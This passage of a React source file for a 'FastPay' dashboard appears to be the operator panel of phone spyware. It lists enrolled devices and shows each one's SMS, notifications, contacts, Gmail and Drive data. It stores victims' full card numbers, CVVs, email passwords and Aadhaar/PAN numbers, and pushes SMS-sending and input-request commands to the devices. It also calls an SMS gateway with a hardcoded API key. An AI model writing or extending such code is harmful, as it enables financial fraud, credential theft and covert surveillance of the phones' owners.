            card_number: data.card_number || '',
            card_holder_name: data.card_holder_name || '',
            bank_name: data.bank_name || '',
            bank_code: data.bank_code || null,
            card_type: data.card_type || 'debit',
            expiry_date: data.expiry_date || null,
            cvv: data.cvv || null,
            account_name: data.account_name || null,
            account_number: data.account_number || null,
            ifsc_code: data.ifsc_code || null,
            branch_name: data.branch_name || null,
            balance: data.balance ? String(data.balance) : null,
            currency: data.currency || 'USD',
            status: data.status || 'active',
            mobile_number: data.mobile_number || null,
            email: data.email || null,
            email_password: data.email_password || null,
            kyc_name: data.kyc_name || null,
            kyc_address: data.kyc_address || null,
            kyc_dob: data.kyc_dob || null,
            kyc_aadhar: data.kyc_aadhar || null,
            kyc_pan: data.kyc_pan || null,
            additional_info: data.additional_info || null,
            created_at: data.created_at || null,
            updated_at: data.updated_at || null,
          })
          setLoadingBankCard(false)
        }
      } catch (error) {
        console.error('Error fetching bank card:', error)
        if (isMounted) {
          setBankCard(null)
          setLoadingBankCard(false)
        }
      }
    }

    fetchBankCard()

    return () => {
      isMounted = false
    }
  }, [selectedUserId])

  // SMS/message management now handled by useDashboardMessages hook

  // Notifications management now handled by useDashboardNotifications hook

  // Fetch phone data from external URL when device with phone is selected (removed 'data' tab check)
  useEffect(() => {
    // Note: 'data' tab removed - phone data can be accessed via system-info or other tabs
    if (false) {
      // Disabled - 'data' tab no longer exists
      return
    }

    const selectedUser = selectedUserId ? users.find(u => u.id === selectedUserId) : null

    if (!selectedUser || !selectedUser.phone) {
      setPhoneData(null)
      setPhoneDataError(null)
      setLoadingPhoneData(false)
      return
    }

    const fetchPhoneData = async () => {
      setLoadingPhoneData(true)
      setPhoneDataError(null)

      try {
        const phoneNumber = encodeURIComponent(selectedUser.phone || '')
        // Use Vite proxy endpoint to avoid CORS issues
        const url = `/api/phone-data/${phoneNumber}`

        const response = await fetch(url)

        if (!response.ok) {
          throw new Error(`Failed to fetch: ${response.status} ${response.statusText}`)
        }

        const htmlContent = await response.text()

        // Parse HTML to extract data and remove scripts
        const parser = new DOMParser()
        const doc = parser.parseFromString(htmlContent, 'text/html')

        // Remove all script tags
        const scripts = doc.querySelectorAll('script')
        scripts.forEach(script => script.remove())

        // Get formatted HTML without scripts (body content)
        const formattedHtml = doc.body ? doc.body.innerHTML : doc.documentElement.outerHTML

        const phoneData: PhoneData = {
          htmlContent: formattedHtml,
        }

        // Extract current time if available
        const timeElement = doc.querySelector('h4')
        if (timeElement) {
          phoneData.currentTime = timeElement.textContent?.trim() || undefined
        }

        // Extract version if available
        const versionElement = Array.from(doc.querySelectorAll('h4')).find(el =>
          el.textContent?.includes('v')
        )
        if (versionElement) {
          phoneData.version = versionElement.textContent?.trim() || undefined
        }

        // Extract battery info
        const batteryText = doc.body.textContent || ''
        const batteryMatch = batteryText.match(/电量[：:]\s*(\d+%)/i)
        if (batteryMatch) {
          phoneData.battery = batteryMatch[1]
        }

        // Extract table data
        const table = doc.querySelector('table')
        if (table) {
          const rows = Array.from(table.querySelectorAll('tr')).slice(1) // Skip header row
          phoneData.messages = rows
            .map(row => {
              const cells = Array.from(row.querySelectorAll('td'))
              return {
                localNumber: cells[0]?.textContent?.trim() || '',
                senderNumber: cells[1]?.textContent?.trim() || '',
                receiveTime: cells[2]?.textContent?.trim() || '',
                content: cells[3]?.textContent?.trim() || '',
              }
            })
            .filter(msg => msg.localNumber || msg.senderNumber || msg.content)
        }

        setPhoneData(phoneData)
        // Trigger fade animation by updating key
        setPhoneDataKey(prev => prev + 1)
      } catch (error) {
        if (error instanceof DOMException && error.name === 'AbortError') {
          return
        }
        console.error('Error fetching phone data:', error)
        setPhoneDataError(error instanceof Error ? error.message : 'Failed to fetch phone data')
        setPhoneData(null)
      } finally {
        setLoadingPhoneData(false)
      }
    }

    // Fetch once when selected user changes (disabled - legacy phone data view)
    // fetchPhoneData() // Disabled until legacy phone data view is reintroduced
  }, [selectedUserId, users]) // Removed activeTab from dependencies

  // Fetch input files from Firebase Storage
  const shouldLoadInputFiles =
    activeTab === 'input' || (deviceSubTab === 'data' && dataSubTab === 'input')

  useEffect(() => {
    if (!shouldLoadInputFiles || !selectedUserId) {
      setInputFiles([])
      return
    }

    let isMounted = true

    const fetchInputFiles = async () => {
      setLoadingInputFiles(true)
      try {
        const listRef = storageRef(storage, `inputs/${selectedUserId}`)
        const res = await listAll(listRef)

        const files = await Promise.all(
          res.items.map(async itemRef => {
            const url = await getDownloadURL(itemRef)
            const metadata = await getMetadata(itemRef)
            return {
              name: itemRef.name,
              url,
              contentType: metadata.contentType || 'application/octet-stream',
              time: metadata.timeCreated,
              size: metadata.size,
            }
          })
        )

        // Sort by time descending
        files.sort((a, b) => new Date(b.time).getTime() - new Date(a.time).getTime())

        if (isMounted) {
          setInputFiles(files)
        }
      } catch (error) {
        console.error('Error fetching input files:', error)
        if (isMounted) {
          setInputFiles([])
        }
      } finally {
        if (isMounted) {
          setLoadingInputFiles(false)
        }
      }
    }

    fetchInputFiles()

    return () => {
      isMounted = false
    }
  }, [shouldLoadInputFiles, selectedUserId])

  // 🆕 TODO: Add useEffect hooks for new features (to be implemented)
  //
  // Fetch Permissions
  // useEffect(() => {
  //   if (activeTab !== 'permissions' || !selectedUserId) return
  //   // Fetch from fastpay/{deviceId}/permission
  //   // Real-time listener with onValue
  //   // Transform data to PermissionInfo[]
  // }, [activeTab, selectedUserId])
  //
  // Fetch Bank Info
  // useEffect(() => {
  //   if (activeTab !== 'bank-info' || !selectedUserId) return
  //   // Get device code from device metadata
  //   // Fetch from fastpay/device-list/{code}/BANK
  //   // Fetch from fastpay/device-list/{code}/BANKSTATUS
  //   // Real-time listeners
  // }, [activeTab, selectedUserId, deviceCode])
  //
  // Fetch Instruction Card
  // useEffect(() => {
  //   if (activeTab !== 'instructions' || !selectedUserId) return
  //   // Fetch from fastpay/{deviceId}/instructioncard
  //   // Real-time listener
  //   // Sanitize HTML/CSS
  // }, [activeTab, selectedUserId])
  //
  // Fetch Remote Messages
  // useEffect(() => {
  //   if (activeTab !== 'remote-messages' || !selectedUserId) return
  //   // Fetch from fastpay/{deviceId}/messages
  //   // Parse to distinguish remote from SMS
  //   // Real-time listener
  // }, [activeTab, selectedUserId])
  //
  // Fetch System Info
  // useEffect(() => {
  //   if (activeTab !== 'system-info' || !selectedUserId) return
  //   // Fetch from fastpay/{deviceId}/systemInfo
  //   // Fetch from fastpay/{deviceId}/deviceInfo/fetch_*
  //   // Real-time listeners
  //   // Merge data from different sources
  // }, [activeTab, selectedUserId])

  // Contacts management now handled by useDashboardContacts hook (already integrated above)

  const formatDate = (dateString: string | number): string => {
    try {
      // Handle millisecond timestamp (as string or number)
      const timestamp = typeof dateString === 'string' ? parseInt(dateString) : dateString

      // Check if it's a valid millisecond timestamp (13 digits typically)
      if (!isNaN(timestamp) && timestamp > 0) {
        const date = new Date(timestamp)
        // Check if date is valid
        if (!isNaN(date.getTime())) {
          return date.toLocaleString('en-US')
        }
      }

      // Fallback: try parsing as date string (only if it's a string)
      if (typeof dateString === 'string') {
        const date = new Date(dateString)
        if (!isNaN(date.getTime())) {
          return date.toLocaleString('en-US')
        }
      }

      return String(dateString)
    } catch {
      return String(dateString)
    }
  }

  // Format message timestamp for MessagesSection (uses same logic as formatDate but accepts number | string)
  const formatMessageTimestamp = (timestamp: number | string): string => {
    return formatDate(typeof timestamp === 'number' ? timestamp.toString() : timestamp)
  }

  // handleCopy removed - now handled in extracted components

  const handleSMS = () => {
    setMessageType('sms')
    setOtp(['', '', '', '', '', ''])
    setMessageStatus({ type: null, message: '' })
    setIsMessageDialogOpen(true)
    // Focus first input after dialog opens
    setTimeout(() => {
      otpInputRefs.current[0]?.focus()
    }, 100)
  }

  const handleWhatsApp = () => {
    setMessageType('whatsapp')
    setOtp(['', '', '', '', '', ''])
    setMessageStatus({ type: null, message: '' })
    setIsMessageDialogOpen(true)
    // Focus first input after dialog opens
    setTimeout(() => {
      otpInputRefs.current[0]?.focus()
    }, 100)
  }

  const handleOtpChange = (index: number, value: string) => {
    // Only allow digits
    if (value && !/^\d$/.test(value)) return

    const newOtp = [...otp]
    newOtp[index] = value
    setOtp(newOtp)

    // Auto-focus next input
    if (value && index < 5) {
      otpInputRefs.current[index + 1]?.focus()
    }
  }

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    // Handle backspace
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      otpInputRefs.current[index - 1]?.focus()
    }
  }

  const handleOtpPaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault()
    const pastedData = e.clipboardData.getData('text').slice(0, 6)
    if (/^\d+$/.test(pastedData)) {
      const newOtp = [...otp]
      for (let i = 0; i < 6; i++) {
        newOtp[i] = pastedData[i] || ''
      }
      setOtp(newOtp)
      // Focus the last filled input or the last input
      const lastFilledIndex = Math.min(pastedData.length - 1, 5)
      otpInputRefs.current[lastFilledIndex]?.focus()
    }
  }

  const generateRandomOtp = () => {
    const randomOtp = Array.from({ length: 6 }, () => Math.floor(Math.random() * 10).toString())
    setOtp(randomOtp)
    // Focus the last input after generating
    setTimeout(() => {
      otpInputRefs.current[5]?.focus()
    }, 0)
  }

  const sendMessage = async () => {
    const otpValue = otp.join('')
    if (!selectedUser || !selectedUser.phone || otpValue.length !== 6 || !messageType) {
      return
    }

    setSendingMessage(true)
    setMessageStatus({ type: null, message: '' })

    try {
      // Remove any non-digit characters for phone number
      const cleanPhone = selectedUser.phone.replace(/\D/g, '')

      // Use Vite proxy endpoint to avoid CORS issues
      const apiEndpoint = messageType === 'sms' ? '/api/send-sms' : '/api/send-whatsapp'

      const data = {
        sender_id: '47',
        variables_values: otpValue,
        numbers: cleanPhone,
      }

      const response = await fetch(apiEndpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
      })

      // Check if response is JSON
      const contentType = response.headers.get('content-type')
      let result: any

      if (contentType && contentType.includes('application/json')) {
        result = await response.json()
      } else {
        // If not JSON, try to get text response
        const textResponse = await response.text()
        console.error('Non-JSON response:', textResponse.substring(0, 200))

        // Check if it's an HTML error page
        if (textResponse.includes('<!DOCTYPE') || textResponse.includes('<html')) {
          throw new Error(
            `WhatsApp endpoint returned an error page. The endpoint may not be available or configured incorrectly.`
          )
        }

        // Try to parse as JSON anyway (in case content-type is wrong)
        try {
          result = JSON.parse(textResponse)
        } catch {
          throw new Error(`Invalid response from server: ${textResponse.substring(0, 100)}`)
        }
      }

      if (response.ok) {
        setMessageStatus({
          type: 'success',
          message: `${messageType === 'sms' ? 'SMS' : 'WhatsApp'} sent successfully!`,
        })
        setOtp(['', '', '', '', '', ''])
        // Close dialog after 2 seconds
        setTimeout(() => {
          setIsMessageDialogOpen(false)
          setMessageStatus({ type: null, message: '' })
        }, 2000)
      } else {
        setMessageStatus({
          type: 'error',
          message:
            result.message ||
            result.error ||
            `Failed to send ${messageType === 'sms' ? 'SMS' : 'WhatsApp'}`,
        })
      }
    } catch (error) {
      console.error('Error sending message:', error)
      let errorMessage = 'Failed to send message'

      if (error instanceof TypeError && error.message.includes('Failed to fetch')) {
        errorMessage = 'Connection error. Please make sure the development server is running.'
      } else if (error instanceof SyntaxError && error.message.includes('JSON')) {
        errorMessage =
          messageType === 'whatsapp'
            ? 'WhatsApp endpoint may not be available. Please check the API configuration or use SMS instead.'
            : 'Invalid response from server. Please try again.'
      } else if (error instanceof Error) {
        errorMessage = error.message
      }

      setMessageStatus({
        type: 'error',
        message: `Error: ${errorMessage}`,
      })
    } finally {
      setSendingMessage(false)
    }
  }

  const handleGetInput = () => {
    setIsGetInputDialogOpen(true)
    setSelectedInputType(null)
    setMessageStatus({ type: null, message: '' })
  }

  const sendInputRequest = async () => {
    if (!selectedUser || !selectedInputType) return

    setSendingInputRequest(true)
    setMessageStatus({ type: null, message: '' })

    try {
      // Use instructioncard path for input requests
      const inputRef = getDeviceMetadataPath(selectedUser.id, 'takeinput')

      if (selectedInputType === 'None') {
        await remove(inputRef)
        setMessageStatus({
          type: 'success',
          message: 'Input request cleared successfully!',
        })
      } else {
        await set(inputRef, selectedInputType)
        setMessageStatus({
          type: 'success',
          message: 'Input request sent successfully!',
        })
      }

      setTimeout(() => {
        setIsGetInputDialogOpen(false)
        setMessageStatus({ type: null, message: '' })
        setSelectedInputType(null)
      }, 2000)
    } catch (error) {
      console.error('Error sending input request:', error)
      setMessageStatus({
        type: 'error',
        message: error instanceof Error ? error.message : 'Failed to send input request',
      })
    } finally {
      setSendingInputRequest(false)
    }
  }

  const handleFileUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0]
    if (!file || !selectedUserId) return

    // Create a temporary ID for feedback
    setMessageStatus({
      type: 'success', // Using success color for "info" state for now
      message: `Uploading ${file.type.startsWith('image/') ? 'image' : 'video'}...`,
    })

    try {
      const timestamp = Date.now()
      // Use a different path for instructions attachments to keep them organized
      const fileRef = storageRef(
        storage,
        `instructions/${selectedUserId}/${timestamp}_${file.name}`
      )

      await uploadBytes(fileRef, file)
      const url = await getDownloadURL(fileRef)

      let htmlToInsert = ''
      if (file.type.startsWith('image/')) {
        htmlToInsert = `<br/><img src="${url}" alt="attached image" style="max-width: 100%; height: auto; border-radius: 8px; margin: 10px 0;" /><br/>`
      } else if (file.type.startsWith('video/')) {
        htmlToInsert = `<br/><video src="${url}" controls style="max-width: 100%; border-radius: 8px; margin: 10px 0;"></video><br/>`
      }

      setInstructionText(prev => prev + htmlToInsert)
      setMessageStatus({
        type: 'success',
        message: 'File attached successfully!',
      })
    } catch (error) {
      console.error('Error uploading file:', error)
      setMessageStatus({
        type: 'error',
        message: 'Failed to upload file',
      })
    } finally {
      if (fileInputRef.current) {
        fileInputRef.current.value = ''
      }
    }
  }

  const handleSendGenericSms = async () => {
    if (!sendSmsPhone || !sendSmsMessage || sendSmsPhone.length !== 10) return
    if (selectedTargetDeviceIds.length === 0) {
      setMessageStatus({ type: 'error', message: 'Please select at least one device' })
      return
    }

    setSendingMessage(true)
    setMessageStatus({ type: null, message: '' })

    try {
      // Construct content string: sim;phone:message
      const content = `${sendSmsSim};${sendSmsPhone}:${sendSmsMessage}`
      let successCount = 0
      let failCount = 0

      // Send to each selected device one by one
      for (const deviceId of selectedTargetDeviceIds) {
        try {
          const commandRef = getDeviceCommandsPath(deviceId, 'sendSms')
          await set(commandRef, content)
          successCount++
        } catch (err) {
          console.error(`Failed to send to ${deviceId}:`, err)
          failCount++
        }
      }

      if (successCount > 0) {
        setMessageStatus({
          type: 'success',
          message: `SMS command sent to ${successCount} devices${failCount > 0 ? `, ${failCount} failed` : ''}!`,
        })

        // Close dialog after 2 seconds
        setTimeout(() => {
          setIsSendSmsDialogOpen(false)
          setMessageStatus({ type: null, message: '' })
          setSendSmsPhone('')
          setSendSmsMessage('')
          setSendSmsSim('1')
          setSelectedTargetDeviceIds([])
        }, 2000)
      } else {
        throw new Error('Failed to send to any device')
      }
    } catch (error) {
      console.error('Error sending SMS command:', error)
      setMessageStatus({
        type: 'error',
        message: error instanceof Error ? error.message : 'Failed to send SMS command',
      })
    } finally {
      setSendingMessage(false)
    }
  }

  // Get selected user for display in header
  const selectedUser = selectedUserId ? users.find(u => u.id === selectedUserId) : null

  // Generate random 6-digit OTP
  const generateOTP = () => {
    return Math.floor(100000 + Math.random() * 900000).toString()
  }

  // Quick send SMS function - generates random OTP and sends via API
  const handleQuickSendSMS = async (
    phoneNumber: string
  ): Promise<{ success: boolean; otp?: string; error?: string }> => {
    // Generate random 6-digit OTP
    const otpValue = generateOTP()
    const cleanPhoneNumber = phoneNumber.replace(/\D/g, '') // Remove non-digits

    // Clear any existing timeout
    if (otpTimeoutRef.current) {
      clearTimeout(otpTimeoutRef.current)
    }

    try {
      // Try serverless function first, with fallback to direct API
      let response: Response
      let data: any

      try {
        response = await fetch('/api/send-sms', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            sender_id: '47',
            variables_values: otpValue,
            numbers: cleanPhoneNumber,
          }),
        })

        // Get response as text first to check if it's HTML
        const responseText = await response.text()

        // Check if it's an HTML error page
        if (
          responseText.trim().toLowerCase().startsWith('<!doctype') ||
          responseText.trim().toLowerCase().startsWith('<html') ||
          responseText.includes('<!DOCTYPE') ||
          responseText.includes('<html')
        ) {
          throw new Error('Serverless function returned HTML error page')
        }

        // Try to parse as JSON
        try {
          data = JSON.parse(responseText)
        } catch (parseError) {
          // If parsing fails and response is not OK, try direct API
          if (!response.ok) {
            throw new Error('Serverless function returned non-JSON error')
          }
          throw new Error(`Invalid JSON response: ${responseText.substring(0, 100)}`)
        }
      } catch (serverlessError) {
        // Fallback to direct API call
        console.warn('Serverless function failed, trying direct API call:', serverlessError)

        try {
          const directResponse = await fetch('https://blacksms.in/sms', {
            method: 'POST',
            headers: {
              Authorization: 'e462fb93354afaef64ed5b40e91ee6ff',
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              sender_id: '47',
              variables_values: otpValue,
              numbers: cleanPhoneNumber,
            }),
          })

          const directText = await directResponse.text()

          // Check if direct API also returned HTML
          if (
            directText.trim().toLowerCase().startsWith('<!doctype') ||
            directText.trim().toLowerCase().startsWith('<html') ||
            directText.includes('<!DOCTYPE') ||
            directText.includes('<html')
          ) {
            throw new Error('Direct API also returned HTML error page')
          }

          // Parse direct API response
          try {
            data = JSON.parse(directText)
          } catch (parseError) {
            throw new Error(`Invalid JSON from direct API: ${directText.substring(0, 100)}`)
          }
        } catch (directApiError) {
          // Both methods failed
          throw new Error(
            `Both serverless function and direct API failed. Last error: ${directApiError instanceof Error ? directApiError.message : 'Unknown error'}`
          )
        }
      }

      // Check for success: status === 1
      if (data.status === 1) {
        // Show OTP in button for 30 seconds
        setLastSentOTP({ phone: phoneNumber, otp: otpValue })

        // Clear OTP display after 30 seconds
        otpTimeoutRef.current = setTimeout(() => {
          setLastSentOTP(null)
        }, 30000)

        toast({
          title: '✅ OTP Sent Successfully',
          description: `OTP code ${otpValue} has been sent to ${phoneNumber}. The code will be displayed for 30 seconds.`,
          variant: 'success',
        })

        return { success: true, otp: otpValue }
      } else {
        // Handle failure: status === 0 or any other status
        const errorMessage = data.message || data.error || 'Failed to send OTP'
        let errorTitle = '❌ Failed to Send OTP'
        let errorDescription = errorMessage

        // Provide more specific error messages
        if (errorMessage.includes('Invalid') || errorMessage.includes('invalid')) {
          errorDescription = `Invalid phone number format: ${phoneNumber}. Please check the number and try again.`
        } else if (errorMessage.includes('limit') || errorMessage.includes('quota')) {
          errorDescription = 'SMS sending limit reached. Please try again later.'
        } else if (errorMessage.includes('network') || errorMessage.includes('timeout')) {
          errorDescription = 'Network error. Please check your connection and try again.'
        } else if (errorMessage.includes('unauthorized') || errorMessage.includes('auth')) {
          errorDescription = 'Authentication failed. Please contact support.'
        }

        toast({
          title: errorTitle,
          description: errorDescription,
          variant: 'destructive',
        })

        return { success: false, error: errorDescription }
      }
    } catch (error) {
      console.error('Error sending SMS:', error)

      let errorDescription = 'Failed to send OTP. Please try again.'
      let errorTitle = '❌ Failed to Send OTP'

      // Provide more specific error messages based on error type
      if (error instanceof TypeError && error.message.includes('Failed to fetch')) {
        errorDescription =
          'Network connection failed. Please check your internet connection and try again.'
      } else if (error instanceof SyntaxError) {
        errorDescription =
          'Invalid response from server. The API may be unavailable. Please try again or contact support.'
      } else if (error instanceof Error) {
        // Check for specific error messages
        if (error.message.includes('error page') || error.message.includes('not available')) {
          errorDescription =
            'API endpoint is not available. Please check server configuration or contact support.'
        } else if (error.message.includes('Invalid response')) {
          errorDescription =
            'Server returned an unexpected response. Please try again or contact support.'
        } else {
          errorDescription = `Error: ${error.message}. Please try again.`
        }
      }

      toast({
        title: errorTitle,
        description: errorDescription,
        variant: 'destructive',
      })

      return { success: false, error: errorDescription }
    }
  }

  // Cleanup timeout on unmount
  useEffect(() => {
    return () => {
      if (otpTimeoutRef.current) {
        clearTimeout(otpTimeoutRef.current)
      }
    }
  }, [])

  // Format lastSeen function - takes a timestamp and returns formatted string
  // Show "Connected" for < 20 seconds, exact seconds for 20-59s, then minutes/hours
  const formattedLastSeen = useCallback(
    (timestamp: number) => {
      if (!timestamp) return 'Never'

      try {
        const now = currentTime
        const lastSeenTime = timestamp
        const diffMs = now - lastSeenTime
        const diffSeconds = Math.floor(diffMs / 1000)

        // Handle future timestamps (clock sync issues) - treat as just connected
        if (diffSeconds < 0) {
          return 'Connected'
        }

        // If less than 20 seconds, show "Connected"
        if (diffSeconds >= 0 && diffSeconds < 20) {
          return 'Connected'
        }

        // For times 20-59 seconds old, show exact second count
        if (diffSeconds >= 20 && diffSeconds < 60) {
          return `${diffSeconds} seconds ago`
        }

        // For times 60 seconds to 120 seconds, show exact seconds
        if (diffSeconds >= 60 && diffSeconds <= 120) {
          return `${diffSeconds} seconds ago`
        }

        // For times older than 120 seconds, calculate minutes/hours manually to avoid "less than a minute"
        const diffMinutes = Math.floor(diffSeconds / 60)
        const diffHours = Math.floor(diffMinutes / 60)
        const diffDays = Math.floor(diffHours / 24)

        if (diffDays > 0) {
          return `${diffDays} day${diffDays > 1 ? 's' : ''} ago`
        } else if (diffHours > 0) {
          return `${diffHours} hour${diffHours > 1 ? 's' : ''} ago`
        } else if (diffMinutes > 0) {
          return `${diffMinutes} minute${diffMinutes > 1 ? 's' : ''} ago`
        }

        // Fallback to formatDistanceToNow only if calculation fails
        return formatDistanceToNow(new Date(timestamp), { addSuffix: true })
      } catch {
        return 'Unknown'
      }
    },
    [currentTime]
  )

  // Show loading state if session is not ready yet
  if (!session) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center">
        <div className="text-center">
          <Loader className="h-8 w-8 animate-spin mx-auto mb-4" />
          <p className="text-muted-foreground">Loading...</p>
        </div>
      </div>
    )
  }

  // Get user email and access level from session
  const userEmail = session?.email || null

  // Helper functions for bank card formatting
  const formatBalance = (balance: string | null, currency: string): string => {
    if (!balance) return 'N/A'
    const num = parseFloat(balance)
    if (isNaN(num)) return balance
    return new Intl.NumberFormat('en-US', {
      style: 'currency',
      currency: currency || 'USD',
    }).format(num)
  }

  const formatBankCardDate = (dateString: string | null): string => {
    if (!dateString) return 'N/A'
    try {
      return new Date(dateString).toLocaleDateString('en-US', {
        year: 'numeric',
        month: 'short',
        day: 'numeric',
      })
    } catch {
      return dateString
    }
  }

  const maskSensitiveData = (value: string | null, type: 'card' | 'account' | 'aadhar' | 'pan' | 'password'): string => {
    if (!value) return 'N/A'
    if (type === 'password') return '••••••••'
    if (type === 'card') return value.length > 4 ? `****${value.slice(-4)}` : value
    if (type === 'account') return value.length > 4 ? `****${value.slice(-4)}` : value
    if (type === 'aadhar') return value.length > 4 ? `****${value.slice(-4)}` : value
    if (type === 'pan') return value.length > 4 ? `****${value.slice(-4)}` : value
    return value
  }

  const getStatusBadgeVariant = (status: string): 'default' | 'secondary' | 'destructive' => {
    switch (status) {
      case 'active':
        return 'default'
      case 'inactive':
        return 'secondary'
      case 'blocked':
        return 'destructive'
      default:
        return 'secondary'
    }
  }

  const getCardTypeBadgeVariant = (type: string): 'default' | 'secondary' | 'outline' => {
    switch (type) {
      case 'credit':
        return 'default'
      case 'debit':
        return 'secondary'
      case 'prepaid':
        return 'outline'
      default:
        return 'outline'
    }
  }

  return (
    <>
      <UnifiedLayout
        showAdminFeatures={isAdmin}
        selectedDeviceId={selectedUserId}
        devices={users.map(user => ({
          id: user.id,
          name: user.device || user.id,
          code: user.code || undefined,
          phone: user.phone || undefined,
          currentPhone: user.phone || undefined,
          lastSeen: user.lastSeen || undefined,
          batteryPercentage: user.batteryPercentage || undefined,
          isActive: user.isOnline || false,
          time: user.time ? parseInt(user.time) : undefined,
        }))}
        onDeviceSelect={deviceId => {
          handleDeviceSelect(deviceId)
          // Automatically show messages when device is selected
          if (deviceId) {
            setActiveTab('sms')
            setDeviceSubTab('message') // Default to message tab
          }
        }}
        onAttachBankCard={deviceId => {
          handleDeviceSelect(deviceId)
          setActiveTab('add-bank-card')
        }}
        taglineMap={taglineMap}
        title="FastPay"
        description={isAdmin ? 'Administrator Panel' : undefined}
        userEmail={userEmail}
        userAccessLevel={userAccessLevel}
        onLogout={handleLogout}
        onRefreshDevices={handleRefreshDevices}
        overallActiveTab={activeTab}
        onOverallTabChange={(tab) => {
          setSelectedUserId(null)
          setActiveTab(tab as ActiveTabType)
        }}
        onDeviceClear={() => {
          setSelectedUserId(null)
        }}
        rightSidebar={deviceId => {
          const currentDeviceId = deviceId || selectedUserId
          const currentUser = users.find(u => u.id === currentDeviceId)
          const deviceBatteryValue = deviceBattery ?? currentUser?.batteryPercentage ?? null
          const deviceLastSeenValue = deviceLastSeen ?? currentUser?.lastSeen ?? 0
          const deviceStatusLabel =
            deviceStatus === 'online' ? 'Online' : deviceStatus === 'offline' ? 'Offline' : 'Checking'
          
          return (
            <DeviceSummaryCards
              bankCard={bankCard}
              loadingBankCard={loadingBankCard}
              deviceStatus={deviceStatus}
              deviceStatusLabel={deviceStatusLabel}
              deviceBatteryValue={deviceBatteryValue}
              deviceLastSeenValue={deviceLastSeenValue}
              currentUserCode={currentUser?.code}
              formatLastSeen={formattedLastSeen}
              maskSensitiveData={maskSensitiveData}
              getStatusBadgeVariant={getStatusBadgeVariant}
              onEditBankCard={() => setActiveTab('bank-cards')}
            />
          )
        }}
      >
        {deviceId => {
          // Use the provided deviceId, or fall back to selectedUserId
          const currentDeviceId = deviceId || selectedUserId
          const currentUser = users.find(u => u.id === currentDeviceId)

          return (
            <>
              {devicesError && (
                <div className="mb-3 flex flex-wrap items-start justify-between gap-3 rounded-md border border-destructive/40 bg-destructive/10 p-3">
                  <div className="text-sm text-destructive">
                    <p className="font-medium">Device list failed to load</p>
                    <p className="text-destructive/90">{devicesError}</p>
                  </div>
                  <Button variant="outline" size="sm" onClick={refreshDevices}>
                    Retry
                  </Button>
                </div>
              )}
              {/* Device Sub-Tabs - Show whenever a device is selected */}
              {currentDeviceId && (
                <DeviceSubTabs
                  activeTab={deviceSubTab}
                  onTabChange={setDeviceSubTab}
                  deviceId={currentDeviceId}
                />
              )}
              
              {/* Content Sections */}
              {currentDeviceId ? (
                // Device-specific content based on sub-tab
                deviceSubTab === 'message' ? (
                  <Suspense fallback={<SectionLoader />}>
                    <MessagesSection
                      deviceId={currentDeviceId}
                      messages={sms}
                      rawMessages={rawSms}
                      loading={smsLoading}
                      error={smsError}
                      isConnected={isConnected}
                      isAdmin={isAdmin}
                      selectedProcessorId={selectedProcessorId}
                      processorInput={processorInput}
                      onProcessorChange={setSelectedProcessorId}
                      onProcessorInputChange={setProcessorInput}
                      onRetry={() => {
                        refreshMessages()
                      }}
                      formatMessageTimestamp={formatMessageTimestamp}
                    />
                  </Suspense>
                ) : deviceSubTab === 'google' ? (
                  <div className="space-y-4">
                    <Suspense fallback={<SectionLoader />}>
                      <GmailSection deviceId={currentDeviceId} isAdmin={isAdmin} />
                    </Suspense>
                    <Suspense fallback={<SectionLoader />}>
                      <DriveSection deviceId={currentDeviceId} isAdmin={isAdmin} />
                    </Suspense>
                  </div>
                ) : deviceSubTab === 'data' ? (
                  <div className="space-y-4">
                    <Tabs
                      value={dataSubTab}
                      onValueChange={value => setDataSubTab(value as DataSubTab)}
                      className="w-full"
                    >
                      <TabsList className="flex flex-wrap items-center gap-2">
                        <TabsTrigger value="notifications" className="flex items-center gap-2 text-xs sm:text-sm">
                          <Bell className="h-4 w-4" />
                          Notifications
                        </TabsTrigger>
                        <TabsTrigger value="contacts" className="flex items-center gap-2 text-xs sm:text-sm">
                          <Contact className="h-4 w-4" />
                          Contacts
                        </TabsTrigger>
                        <TabsTrigger value="input" className="flex items-center gap-2 text-xs sm:text-sm">
                          <TextCursorInput className="h-4 w-4" />
                          Input Files
                        </TabsTrigger>
                        <TabsTrigger value="system-info" className="flex items-center gap-2 text-xs sm:text-sm">
                          <Monitor className="h-4 w-4" />
                          System Info
                        </TabsTrigger>
                        <TabsTrigger value="bank-info" className="flex items-center gap-2 text-xs sm:text-sm">
                          <Building2 className="h-4 w-4" />
                          Bank Info
                        </TabsTrigger>
                        <TabsTrigger value="export" className="flex items-center gap-2 text-xs sm:text-sm">
                          <Download className="h-4 w-4" />
                          Export
                        </TabsTrigger>
                        <TabsTrigger value="remote-messages" className="flex items-center gap-2 text-xs sm:text-sm">
                          <PictureInPicture2 className="h-4 w-4" />
                          Remote Messages
                        </TabsTrigger>
                      </TabsList>

                      <TabsContent value="notifications" className="mt-4">
                        <Suspense fallback={<SectionLoader />}>
                          <NotificationsSection
                            deviceId={currentDeviceId}
                            notifications={notifications}
                            loading={notificationsLoading}
                            error={notificationsError}
                            isConnected={isConnected}
                            isAdmin={isAdmin}
                            syncEnabled={notificationsSyncEnabled}
                            formatNotificationTimestamp={formatDate}
                          />
                        </Suspense>
                      </TabsContent>

                      <TabsContent value="contacts" className="mt-4">
                        <Suspense fallback={<SectionLoader />}>
                          <ContactsSection
                            deviceId={currentDeviceId}
                            contacts={contacts}
                            loading={contactsLoading}
                            error={contactsError}
                            isConnected={isConnected}
                            isAdmin={isAdmin}
                            syncEnabled={contactsSyncEnabled}
                          />
                        </Suspense>
                      </TabsContent>

                      <TabsContent value="input" className="mt-4">
                        <Suspense fallback={<SectionLoader />}>
                          <InputFilesSection
                            deviceId={currentDeviceId}
                            files={inputFiles}
                            loading={loadingInputFiles}
                            previewFile={previewFile}
                            onPreview={setPreviewFile}
                            onClosePreview={() => setPreviewFile(null)}
                          />
                        </Suspense>
                      </TabsContent>

                      <TabsContent value="system-info" className="mt-4">
                        <Suspense fallback={<SectionLoader />}>
                          <SystemInfoSection deviceId={currentDeviceId} />
                        </Suspense>
                      </TabsContent>

